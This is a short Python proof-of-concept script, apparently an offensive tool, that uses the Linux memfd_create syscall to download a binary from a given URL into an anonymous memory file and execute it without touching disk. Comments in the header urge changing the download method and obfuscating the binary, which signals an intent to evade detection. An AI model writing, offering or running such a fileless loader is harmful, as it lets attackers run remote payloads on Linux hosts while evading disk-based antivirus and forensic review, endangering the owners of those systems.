#!/usr/bin/python
# Andres Doreste
# Just a PoC! won't work on Kernels < 3.17
# Change the download method and don't forget obfuscate the binary (;
import ctypes
import os
import sys
if sys.version_info < (3,0):
	from urllib import urlretrieve
else:
	from urllib.request import urlretrieve

class MemDownExec:
	def __init__(self):
		self.libc = ctypes.CDLL(None)
		self.syscall = self.libc.syscall
		self.proc_number = str(os.getpid())

	def create_mem_file(self):
		# http://man7.org/linux/man-pages/man2/memfd_create.2.html
		fd = self.syscall(319, "", 1)
		mem_file_path = os.path.join("/proc", self.proc_number, "fd", str(fd))
		return mem_file_path

	def down_exec(self, file_url, mem_file_path, argv):
		urlretrieve(file_url, mem_file_path)
		os.execv(mem_file_path, argv)

if __name__ == "__main__":
	if len(sys.argv) < 2:
		print("[+] Usage:")
		print("[+] {} URL ARGS".format(sys.argv[0]))
		print("[>] {} http://127.0.0.1/payload".format(sys.argv[0]))
		exit(1)
	url = sys.argv[1]
	mde = MemDownExec()
	fd = mde.create_mem_file()
	mde.down_exec(url, fd, sys.argv[0:1] + sys.argv[2::])
